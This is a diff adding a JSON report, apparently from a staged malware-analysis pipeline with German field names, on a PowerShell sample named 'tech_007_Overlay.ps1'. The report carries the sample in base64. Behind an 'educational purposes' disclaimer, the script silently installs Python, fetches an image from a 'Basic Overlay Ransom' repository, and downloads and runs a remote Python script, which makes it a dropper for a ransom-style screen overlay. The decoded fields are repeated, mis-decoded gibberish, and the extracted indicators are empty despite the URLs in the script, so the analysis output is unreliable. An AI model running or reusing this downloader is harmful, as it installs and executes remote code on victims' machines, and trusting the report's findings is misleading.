@@ -1,0 +1,63 @@
+{
+  "meta": {
+    "quelldatei": "tech_007_Overlay.ps1",
+    "sha256": "ef42b5f67a29bceb2f4e52d288c578f47df5e925ff73856984242cb905ad7c31",
+    "groesse_bytes": 3348,
+    "zeilen": 1,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 3348,
+        "dekodiert": "‣桔獩猠牣灩⁴獩映牯攠畤慣楴湯污瀠牵潰敳⹳传汮⁹⁡潦汯眠畯摬愠瑣慵汬⁹牴⁹潴栠牡⁭潳敭湯⁥獵湩⁧桴獩猠牣灩⹴䄠汬猠牣灩獴椠癮汯敶⁤湩琠楨⁳牰捯獥⁳異灲獯汥⁹慬正⌊挠敬湡甠⁰潣敤映牯琠敨映湩污猠整獰‮潙⁵楷汬朠瑥挠畡桧⹴删湡潳睭牡⁥獩愠挠楲敭愠摮猠慣浭湩⁧獩攠楶⹬䐠湯⁴敢攠楶⹬昊湵瑣潩⁮瑓牡⵴癏牥慬⁹੻††‣畆据楴湯琠⁯潤湷潬摡愠映汩⁥獵湩⁧敗䍢楬湥ੴ††畦据楴湯䐠睯汮慯ⵤ楆敬笠 †††瀠牡浡⠠ †††††嬠瑳楲杮⑝牵ⱬ †††††嬠瑳楲杮⑝畯灴瑵慐桴 †††⤠ਊ††††眤扥汃敩瑮㴠丠睥伭橢捥⁴祓瑳浥丮瑥圮扥汃敩瑮 †††␠敷䍢楬湥⹴潄湷潬摡楆敬␨牵ⱬ␠畯灴瑵慐桴਩††੽ †⌠䐠睯汮慯⁤祐桴湯椠獮慴汬牥 †␠祰桴湯湉瑳污敬啲汲㴠∠瑨灴㩳⼯睷⹷祰桴湯漮杲是灴瀯瑹潨⽮⸳⸹⼶祰桴湯㌭㤮㘮愭摭㐶攮數ਢ††瀤瑹潨䥮獮慴汬牥慐桴㴠∠攤癮吺䵅屐祰桴湯楟獮慴汬牥攮數ਢ††潄湷潬摡䘭汩⁥甭汲␠祰桴湯湉瑳污敬啲汲ⴠ畯灴瑵慐桴␠祰桴湯湉瑳污敬偲瑡੨ †⌠䤠獮慴汬倠瑹潨੮††瑓牡⵴牐捯獥⁳圭楡⁴䘭汩健瑡⁨瀤瑹潨䥮獮慴汬牥慐桴ⴠ牁畧敭瑮楌瑳∠焯極瑥Ⱒ∠牐灥湥偤瑡㵨∱ਊ††‣湉瑳污⁬楰ੰ††祰桴湯ⴠ⁭湥畳敲楰ੰ †⌠䤠獮慴汬倠汩潬੷††楰㍰椠獮慴汬倠汩潬੷ †⌠䌠敬湡灵 †删浥癯ⵥ瑉浥ⴠ慐桴␠祰桴湯湉瑳污敬偲瑡੨ †⌠䐠晥湩⁥桴⁥剕⁌景琠敨倠䝎映汩⁥湡⁤桴⁥敤瑳湩瑡潩⁮慰桴 †␠潳牵散牕⁬‽栢瑴獰⼺爯睡朮瑩畨畢敳捲湯整瑮挮浯振污湩硵瀭⽹祐桴湯洯楡⽮慂楳╣〲癏牥慬╹〲慒獮浯搯瑡浳慥⹮湰≧ †␠敤瑳湩瑡潩偮瑡⁨‽卛獹整⹭佉倮瑡嵨㨺潃扭湩⡥卛獹整⹭佉倮瑡嵨㨺敇呴浥偰瑡⡨Ⱙ∠慤獴敭湡瀮杮⤢ਊ††‣牃慥整愠圠扥汃敩瑮漠橢捥⁴潴搠睯汮慯⁤桴⁥楦敬 †␠敷䍢楬湥⁴‽敎⵷扏敪瑣匠獹整⹭敎⹴敗䍢楬湥ੴ †琠祲笠 †††⌠䐠睯汮慯⁤桴⁥楦敬 †††␠敷䍢楬湥⹴潄湷潬摡楆敬␨潳牵散牕ⱬ␠敤瑳湩瑡潩偮瑡⥨ †素挠瑡档笠 †††圠楲整䠭獯⁴䔢牲牯搠睯汮慯楤杮琠敨映汩㩥␠⹟硅散瑰潩⹮敍獳条≥ †素映湩污祬笠 †††⌠䐠獩潰敳漠⁦桴⁥敗䍢楬湥⁴扯敪瑣 †††␠敷䍢楬湥⹴楄灳獯⡥਩††੽ †⌠匠瑥琠敨唠䱒漠⁦桴⁥祐桴湯猠牣灩⁴潴搠睯汮慯੤††瀤瑹潨卮牣灩啴汲㴠∠瑨灴㩳⼯慲⹷楧桴扵獵牥潣瑮湥⹴潣⽭慣楬畮⵸祰倯瑹潨⽮慭湩䈯獡捩㈥估敶汲祡㈥到湡潳⽭汆灩数噲牥楳湯瀮≹ਊ††‣敓⁴桴⁥敤瑳湩瑡潩⁮慰桴琠⁯慳敶琠敨搠睯汮慯敤⁤祐桴湯猠牣灩ੴ††搤獥楴慮楴湯慐桴㴠∠攤癮吺䵅屐汆灩数噲牥楳湯瀮≹ਊ††牴⁹੻††††‣潄湷潬摡琠敨倠瑹潨⁮捳楲瑰甠楳杮䤠癮歯ⵥ敗剢煥敵瑳 †††圠楲整䠭獯⁴䐢睯汮慯楤杮琠敨倠瑹潨⁮捳楲瑰⸮∮ †††䤠癮歯ⵥ敗剢煥敵瑳ⴠ牕⁩瀤瑹潨卮牣灩啴汲ⴠ畏䙴汩⁥搤獥楴慮楴湯慐桴ⴠ牅潲䅲瑣潩⁮瑓灯ਊ††††‣畒⁮桴⁥潤湷潬摡摥倠瑹潨⁮捳楲瑰 †††圠楲整䠭獯⁴刢湵楮杮琠敨搠睯汮慯敤⁤祐桴湯猠牣灩⹴⸮ਢ††††祰桴湯攮數␠敤瑳湩瑡潩偮瑡੨††⁽慣捴⁨੻††††牗瑩ⵥ潈瑳∠湁攠牲牯漠捣牵敲㩤␠⹟硅散瑰潩⹮敍獳条≥ †素紊匊慴瑲伭敶汲祡"
+      }
+    ],
+    "base64_bloecke_gesamt": 1
+  },
+  "stufe2_features": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 3348,
+        "dekodiert": "‣桔獩猠牣灩⁴獩映牯攠畤慣楴湯污瀠牵潰敳⹳传汮⁹⁡潦汯眠畯摬愠瑣慵汬⁹牴⁹潴栠牡⁭潳敭湯⁥獵湩⁧桴獩猠牣灩⹴䄠汬猠牣灩獴椠癮汯敶⁤湩琠楨⁳牰捯獥⁳異灲獯汥⁹慬正⌊挠敬湡甠⁰潣敤映牯琠敨映湩污猠整獰‮潙⁵楷汬朠瑥挠畡桧⹴删湡潳睭牡⁥獩愠挠楲敭愠摮猠慣浭湩⁧獩攠楶⹬䐠湯⁴敢攠楶⹬昊湵瑣潩⁮瑓牡⵴癏牥慬⁹੻††‣畆据楴湯琠⁯潤湷潬摡愠映汩⁥獵湩⁧敗䍢楬湥ੴ††畦据楴湯䐠睯汮慯ⵤ楆敬笠 †††瀠牡浡⠠ †††††嬠瑳楲杮⑝牵ⱬ †††††嬠瑳楲杮⑝畯灴瑵慐桴 †††⤠ਊ††††眤扥汃敩瑮㴠丠睥伭橢捥⁴祓瑳浥丮瑥圮扥汃敩瑮 †††␠敷䍢楬湥⹴潄湷潬摡楆敬␨牵ⱬ␠畯灴瑵慐桴਩††੽ †⌠䐠睯汮慯⁤祐桴湯椠獮慴汬牥 †␠祰桴湯湉瑳污敬啲汲㴠∠瑨灴㩳⼯睷⹷祰桴湯漮杲是灴瀯瑹潨⽮⸳⸹⼶祰桴湯㌭㤮㘮愭摭㐶攮數ਢ††瀤瑹潨䥮獮慴汬牥慐桴㴠∠攤癮吺䵅屐祰桴湯楟獮慴汬牥攮數ਢ††潄湷潬摡䘭汩⁥甭汲␠祰桴湯湉瑳污敬啲汲ⴠ畯灴瑵慐桴␠祰桴湯湉瑳污敬偲瑡੨ †⌠䤠獮慴汬倠瑹潨੮††瑓牡⵴牐捯獥⁳圭楡⁴䘭汩健瑡⁨瀤瑹潨䥮獮慴汬牥慐桴ⴠ牁畧敭瑮楌瑳∠焯極瑥Ⱒ∠牐灥湥偤瑡㵨∱ਊ††‣湉瑳污⁬楰ੰ††祰桴湯ⴠ⁭湥畳敲楰ੰ †⌠䤠獮慴汬倠汩潬੷††楰㍰椠獮慴汬倠汩潬੷ †⌠䌠敬湡灵 †删浥癯ⵥ瑉浥ⴠ慐桴␠祰桴湯湉瑳污敬偲瑡੨ †⌠䐠晥湩⁥桴⁥剕⁌景琠敨倠䝎映汩⁥湡⁤桴⁥敤瑳湩瑡潩⁮慰桴 †␠潳牵散牕⁬‽栢瑴獰⼺爯睡朮瑩畨畢敳捲湯整瑮挮浯振污湩硵瀭⽹祐桴湯洯楡⽮慂楳╣〲癏牥慬╹〲慒獮浯搯瑡浳慥⹮湰≧ †␠敤瑳湩瑡潩偮瑡⁨‽卛獹整⹭佉倮瑡嵨㨺潃扭湩⡥卛獹整⹭佉倮瑡嵨㨺敇呴浥偰瑡⡨Ⱙ∠慤獴敭湡瀮杮⤢ਊ††‣牃慥整愠圠扥汃敩瑮漠橢捥⁴潴搠睯汮慯⁤桴⁥楦敬 †␠敷䍢楬湥⁴‽敎⵷扏敪瑣匠獹整⹭敎⹴敗䍢楬湥ੴ †琠祲笠 †††⌠䐠睯汮慯⁤桴⁥楦敬 †††␠敷䍢楬湥⹴潄湷潬摡楆敬␨潳牵散牕ⱬ␠敤瑳湩瑡潩偮瑡⥨ †素挠瑡档笠 †††圠楲整䠭獯⁴䔢牲牯搠睯汮慯楤杮琠敨映汩㩥␠⹟硅散瑰潩⹮敍獳条≥ †素映湩污祬笠 †††⌠䐠獩潰敳漠⁦桴⁥敗䍢楬湥⁴扯敪瑣 †††␠敷䍢楬湥⹴楄灳獯⡥਩††੽ †⌠匠瑥琠敨唠䱒漠⁦桴⁥祐桴湯猠牣灩⁴潴搠睯汮慯੤††瀤瑹潨卮牣灩啴汲㴠∠瑨灴㩳⼯慲⹷楧桴扵獵牥潣瑮湥⹴潣⽭慣楬畮⵸祰倯瑹潨⽮慭湩䈯獡捩㈥估敶汲祡㈥到湡潳⽭汆灩数噲牥楳湯瀮≹ਊ††‣敓⁴桴⁥敤瑳湩瑡潩⁮慰桴琠⁯慳敶琠敨搠睯汮慯敤⁤祐桴湯猠牣灩ੴ††搤獥楴慮楴湯慐桴㴠∠攤癮吺䵅屐汆灩数噲牥楳湯瀮≹ਊ††牴⁹੻††††‣潄湷潬摡琠敨倠瑹潨⁮捳楲瑰甠楳杮䤠癮歯ⵥ敗剢煥敵瑳 †††圠楲整䠭獯⁴䐢睯汮慯楤杮琠敨倠瑹潨⁮捳楲瑰⸮∮ †††䤠癮歯ⵥ敗剢煥敵瑳ⴠ牕⁩瀤瑹潨卮牣灩啴汲ⴠ畏䙴汩⁥搤獥楴慮楴湯慐桴ⴠ牅潲䅲瑣潩⁮瑓灯ਊ††††‣畒⁮桴⁥潤湷潬摡摥倠瑹潨⁮捳楲瑰 †††圠楲整䠭獯⁴刢湵楮杮琠敨搠睯汮慯敤⁤祐桴湯猠牣灩⹴⸮ਢ††††祰桴湯攮數␠敤瑳湩瑡潩偮瑡੨††⁽慣捴⁨੻††††牗瑩ⵥ潈瑳∠湁攠牲牯漠捣牵敲㩤␠⹟硅散瑰潩⹮敍獳条≥ †素紊匊慴瑲伭敶汲祡"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 3348,
+        "dekodiert": "‣桔獩猠牣灩⁴獩映牯攠畤慣楴湯污瀠牵潰敳⹳传汮⁹⁡潦汯眠畯摬愠瑣慵汬⁹牴⁹潴栠牡⁭潳敭湯⁥獵湩⁧桴獩猠牣灩⹴䄠汬猠牣灩獴椠癮汯敶⁤湩琠楨⁳牰捯獥⁳異灲獯汥⁹慬正⌊挠敬湡甠⁰潣敤映牯琠敨映湩污猠整獰‮潙⁵楷汬朠瑥挠畡桧⹴删湡潳睭牡⁥獩愠挠楲敭愠摮猠慣浭湩⁧獩攠楶⹬䐠湯⁴敢攠楶⹬昊湵瑣潩⁮瑓牡⵴癏牥慬⁹੻††‣畆据楴湯琠⁯潤湷潬摡愠映汩⁥獵湩⁧敗䍢楬湥ੴ††畦据楴湯䐠睯汮慯ⵤ楆敬笠 †††瀠牡浡⠠ †††††嬠瑳楲杮⑝牵ⱬ †††††嬠瑳楲杮⑝畯灴瑵慐桴 †††⤠ਊ††††眤扥汃敩瑮㴠丠睥伭橢捥⁴祓瑳浥丮瑥圮扥汃敩瑮 †††␠敷䍢楬湥⹴潄湷潬摡楆敬␨牵ⱬ␠畯灴瑵慐桴਩††੽ †⌠䐠睯汮慯⁤祐桴湯椠獮慴汬牥 †␠祰桴湯湉瑳污敬啲汲㴠∠瑨灴㩳⼯睷⹷祰桴湯漮杲是灴瀯瑹潨⽮⸳⸹⼶祰桴湯㌭㤮㘮愭摭㐶攮數ਢ††瀤瑹潨䥮獮慴汬牥慐桴㴠∠攤癮吺䵅屐祰桴湯楟獮慴汬牥攮數ਢ††潄湷潬摡䘭汩⁥甭汲␠祰桴湯湉瑳污敬啲汲ⴠ畯灴瑵慐桴␠祰桴湯湉瑳污敬偲瑡੨ †⌠䤠獮慴汬倠瑹潨੮††瑓牡⵴牐捯獥⁳圭楡⁴䘭汩健瑡⁨瀤瑹潨䥮獮慴汬牥慐桴ⴠ牁畧敭瑮楌瑳∠焯極瑥Ⱒ∠牐灥湥偤瑡㵨∱ਊ††‣湉瑳污⁬楰ੰ††祰桴湯ⴠ⁭湥畳敲楰ੰ †⌠䤠獮慴汬倠汩潬੷††楰㍰椠獮慴汬倠汩潬੷ †⌠䌠敬湡灵 †删浥癯ⵥ瑉浥ⴠ慐桴␠祰桴湯湉瑳污敬偲瑡੨ †⌠䐠晥湩⁥桴⁥剕⁌景琠敨倠䝎映汩⁥湡⁤桴⁥敤瑳湩瑡潩⁮慰桴 †␠潳牵散牕⁬‽栢瑴獰⼺爯睡朮瑩畨畢敳捲湯整瑮挮浯振污湩硵瀭⽹祐桴湯洯楡⽮慂楳╣〲癏牥慬╹〲慒獮浯搯瑡浳慥⹮湰≧ †␠敤瑳湩瑡潩偮瑡⁨‽卛獹整⹭佉倮瑡嵨㨺潃扭湩⡥卛獹整⹭佉倮瑡嵨㨺敇呴浥偰瑡⡨Ⱙ∠慤獴敭湡瀮杮⤢ਊ††‣牃慥整愠圠扥汃敩瑮漠橢捥⁴潴搠睯汮慯⁤桴⁥楦敬 †␠敷䍢楬湥⁴‽敎⵷扏敪瑣匠獹整⹭敎⹴敗䍢楬湥ੴ †琠祲笠 †††⌠䐠睯汮慯⁤桴⁥楦敬 †††␠敷䍢楬湥⹴潄湷潬摡楆敬␨潳牵散牕ⱬ␠敤瑳湩瑡潩偮瑡⥨ †素挠瑡档笠 †††圠楲整䠭獯⁴䔢牲牯搠睯汮慯楤杮琠敨映汩㩥␠⹟硅散瑰潩⹮敍獳条≥ †素映湩污祬笠 †††⌠䐠獩潰敳漠⁦桴⁥敗䍢楬湥⁴扯敪瑣 †††␠敷䍢楬湥⹴楄灳獯⡥਩††੽ †⌠匠瑥琠敨唠䱒漠⁦桴⁥祐桴湯猠牣灩⁴潴搠睯汮慯੤††瀤瑹潨卮牣灩啴汲㴠∠瑨灴㩳⼯慲⹷楧桴扵獵牥潣瑮湥⹴潣⽭慣楬畮⵸祰倯瑹潨⽮慭湩䈯獡捩㈥估敶汲祡㈥到湡潳⽭汆灩数噲牥楳湯瀮≹ਊ††‣敓⁴桴⁥敤瑳湩瑡潩⁮慰桴琠⁯慳敶琠敨搠睯汮慯敤⁤祐桴湯猠牣灩ੴ††搤獥楴慮楴湯慐桴㴠∠攤癮吺䵅屐汆灩数噲牥楳湯瀮≹ਊ††牴⁹੻††††‣潄湷潬摡琠敨倠瑹潨⁮捳楲瑰甠楳杮䤠癮歯ⵥ敗剢煥敵瑳 †††圠楲整䠭獯⁴䐢睯汮慯楤杮琠敨倠瑹潨⁮捳楲瑰⸮∮ †††䤠癮歯ⵥ敗剢煥敵瑳ⴠ牕⁩瀤瑹潨卮牣灩啴汲ⴠ畏䙴汩⁥搤獥楴慮楴湯慐桴ⴠ牅潲䅲瑣潩⁮瑓灯ਊ††††‣畒⁮桴⁥潤湷潬摡摥倠瑹潨⁮捳楲瑰 †††圠楲整䠭獯⁴刢湵楮杮琠敨搠睯汮慯敤⁤祐桴湯猠牣灩⹴⸮ਢ††††祰桴湯攮數␠敤瑳湩瑡潩偮瑡੨††⁽慣捴⁨੻††††牗瑩ⵥ潈瑳∠湁攠牲牯漠捣牵敲㩤␠⹟硅散瑰潩⹮敍獳条≥ †素紊匊慴瑲伭敶汲祡"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {},
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "IyBUaGlzIHNjcmlwdCBpcyBmb3IgZWR1Y2F0aW9uYWwgcHVycG9zZXMuIE9ubHkgYSBmb29sIHdvdWxkIGFjdHVhbGx5IHRyeSB0byBoYXJtIHNvbWVvbmUgdXNpbmcgdGhpcyBzY3JpcHQuIEFsbCBzY3JpcHRzIGludm9sdmVkIGluIHRoaXMgcHJvY2VzcyBwdXJwb3NlbHkgbGFjawojIGNsZWFuIHVwIGNvZGUgZm9yIHRoZSBmaW5hbCBzdGVwcy4gWW91IHdpbGwgZ2V0IGNhdWdodC4gUmFuc29td2FyZSBpcyBhIGNyaW1lIGFuZCBzY2FtbWluZyBpcyBldmlsLiBEb250IGJlIGV2aWwuCmZ1bmN0aW9uIFN0YXJ0LU92ZXJsYXkgewogICAgIyBGdW5jdGlvbiB0byBkb3dubG9hZCBhIGZpbGUgdXNpbmcgV2ViQ2xpZW50CiAgICBmdW5jdGlvbiBEb3dubG9hZC1GaWxlIHsKICAgICAgICBwYXJhbSAoCiAgICAgICAgICAgIFtzdHJpbmddJHVybCwKICAgICAgICAgICAgW3N0cmluZ10kb3V0cHV0UGF0aAogICAgICAgICkKCiAgICAgICAgJHdlYkNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKICAgICAgICAkd2ViQ2xpZW50LkRvd25sb2FkRmlsZSgkdXJsLCAkb3V0cHV0UGF0aCkKICAgIH0KCiAgICAjIERvd25sb2FkIFB5dGhvbiBpbnN0YWxsZXIKICAgICRweXRob25JbnN0YWxsZXJVcmwgPSAiaHR0cHM6Ly93d3cucHl0aG9uLm9yZy9mdHAvcHl0aG9uLzMuOS42L3B5dGhvbi0zLjkuNi1hbWQ2NC5leGUiCiAgICAkcHl0aG9uSW5zdGFsbGVyUGF0aCA9ICIkZW52OlRFTVBccHl0aG9uX2luc3RhbGxlci5leGUiCiAgICBEb3dubG9hZC1GaWxlIC11cmwgJHB5dGhvbkluc3RhbGxlclVybCAtb3V0cHV0UGF0aCAkcHl0aG9uSW5zdGFsbGVyUGF0aAoKICAgICMgSW5zdGFsbCBQeXRob24KICAgIFN0YXJ0LVByb2Nlc3MgLVdhaXQgLUZpbGVQYXRoICRweXRob25JbnN0YWxsZXJQYXRoIC1Bcmd1bWVudExpc3QgIi9xdWlldCIsICJQcmVwZW5kUGF0aD0xIgoKICAgICMgSW5zdGFsbCBwaXAKICAgIHB5dGhvbiAtbSBlbnN1cmVwaXAKCiAgICAjIEluc3RhbGwgUGlsbG93CiAgICBwaXAzIGluc3RhbGwgUGlsbG93CgogICAgIyBDbGVhbnVwCiAgICBSZW1vdmUtSXRlbSAtUGF0aCAkcHl0aG9uSW5zdGFsbGVyUGF0aAoKICAgICMgRGVmaW5lIHRoZSBVUkwgb2YgdGhlIFBORyBmaWxlIGFuZCB0aGUgZGVzdGluYXRpb24gcGF0aAogICAgJHNvdXJjZVVybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2FsaW51eC1weS9QeXRob24vbWFpbi9CYXNpYyUyME92ZXJsYXklMjBSYW5zb20vZGF0c21lYW4ucG5nIgogICAgJGRlc3RpbmF0aW9uUGF0aCA9IFtTeXN0ZW0uSU8uUGF0aF06OkNvbWJpbmUoW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcFBhdGgoKSwgImRhdHNtZWFuLnBuZyIpCgogICAgIyBDcmVhdGUgYSBXZWJDbGllbnQgb2JqZWN0IHRvIGRvd25sb2FkIHRoZSBmaWxlCiAgICAkd2ViQ2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAoKICAgIHRyeSB7CiAgICAgICAgIyBE",
+    "dekodierte_befehle": [
+      "‣桔獩猠牣灩⁴獩映牯攠畤慣楴湯污瀠牵潰敳⹳传汮⁹⁡潦汯眠畯摬愠瑣慵汬⁹牴⁹潴栠牡⁭潳敭湯⁥獵湩⁧桴獩猠牣灩⹴䄠汬猠牣灩獴椠癮汯敶⁤湩琠楨⁳牰捯獥⁳異灲獯汥⁹慬正⌊挠敬湡甠⁰潣敤映牯琠敨映湩污猠整獰‮潙⁵楷汬朠瑥挠畡桧⹴删湡潳睭牡⁥獩愠挠楲敭愠摮猠慣浭湩⁧獩攠楶⹬䐠湯⁴敢攠楶⹬昊湵瑣潩⁮瑓牡⵴癏牥慬⁹੻††‣畆据楴湯琠⁯潤湷潬摡愠映汩⁥獵湩⁧敗䍢楬湥ੴ††畦据楴湯䐠睯汮慯ⵤ楆敬笠 †††瀠牡浡⠠ †††††嬠瑳楲杮⑝牵ⱬ †††††嬠瑳楲杮⑝畯灴瑵慐桴 †††⤠ਊ††††眤扥汃敩瑮㴠丠睥伭橢捥⁴祓瑳浥丮瑥圮扥汃敩瑮 †††␠敷䍢楬湥⹴潄湷潬摡楆敬␨牵ⱬ␠畯灴瑵慐桴਩††੽ †⌠䐠睯汮慯⁤祐桴湯椠獮慴汬牥 †␠祰桴湯湉瑳污敬啲汲㴠∠瑨灴㩳⼯睷⹷祰桴湯漮杲是灴瀯瑹潨⽮⸳⸹⼶祰桴湯㌭㤮㘮愭摭㐶攮數ਢ††瀤瑹潨䥮獮慴汬牥慐桴㴠∠攤癮吺䵅屐祰桴湯楟獮慴汬牥攮數ਢ††潄湷潬摡䘭汩⁥甭汲␠祰桴湯湉瑳污敬啲汲ⴠ畯灴瑵慐桴␠祰桴湯湉瑳污敬偲瑡੨ †⌠䤠獮慴汬倠瑹潨੮††瑓牡⵴牐捯獥⁳圭楡⁴䘭汩健瑡⁨瀤瑹潨䥮獮慴汬牥慐桴ⴠ牁畧敭瑮楌瑳∠焯極瑥Ⱒ∠牐灥湥偤瑡㵨∱ਊ††‣湉瑳污⁬楰ੰ††祰桴湯ⴠ⁭湥畳敲楰ੰ †⌠䤠獮慴汬倠汩潬੷††楰㍰椠獮慴汬倠汩潬੷ †⌠䌠敬湡灵 †删浥癯ⵥ瑉浥ⴠ慐桴␠祰桴湯湉瑳污敬偲瑡੨ †⌠䐠晥湩⁥桴⁥剕⁌景琠敨倠䝎映汩⁥湡⁤桴⁥敤瑳湩瑡潩⁮慰桴 †␠潳牵散牕⁬‽栢瑴獰⼺爯睡朮瑩畨畢敳捲湯整瑮挮浯振污湩硵瀭⽹祐桴湯洯楡⽮慂楳╣〲癏牥慬╹〲慒獮浯搯瑡浳慥⹮湰≧ †␠敤瑳湩瑡潩偮瑡⁨‽卛獹整⹭佉倮瑡嵨㨺潃扭湩⡥卛獹整⹭佉倮瑡嵨㨺敇呴浥偰瑡⡨Ⱙ∠慤獴敭湡瀮杮⤢ਊ††‣牃慥整愠圠扥汃敩瑮漠橢捥⁴潴搠睯汮慯⁤桴⁥楦敬 †␠敷䍢楬湥⁴‽敎⵷扏敪瑣匠獹整⹭敎⹴敗䍢楬湥ੴ †琠祲笠 †††⌠䐠睯汮慯⁤桴⁥楦敬 †††␠敷䍢楬湥⹴潄湷潬摡楆敬␨潳牵散牕ⱬ␠敤瑳湩瑡潩偮瑡⥨ †素挠瑡档笠 †††圠楲整䠭獯⁴䔢牲牯搠睯汮慯楤杮琠敨映汩㩥␠⹟硅散瑰潩⹮敍獳条≥ †素映湩污祬笠 †††⌠䐠獩潰敳漠⁦桴⁥敗䍢楬湥⁴扯敪瑣 †††␠敷䍢楬湥⹴楄灳獯⡥਩††੽ †⌠匠瑥琠敨唠䱒漠⁦桴⁥祐桴湯猠牣灩⁴潴搠睯汮慯੤††瀤瑹潨卮牣灩啴汲㴠∠瑨灴㩳⼯慲⹷楧桴扵獵牥潣瑮湥⹴潣⽭慣楬畮⵸祰倯瑹潨⽮慭湩䈯獡捩㈥估敶汲祡㈥到湡潳⽭汆灩数噲牥楳湯瀮≹ਊ††‣敓⁴桴⁥敤瑳湩瑡潩⁮慰桴琠⁯慳敶琠敨搠睯汮慯敤⁤祐桴湯猠牣灩"
+    ],
+    "beobachtete_abfolge": []
+  }
+}
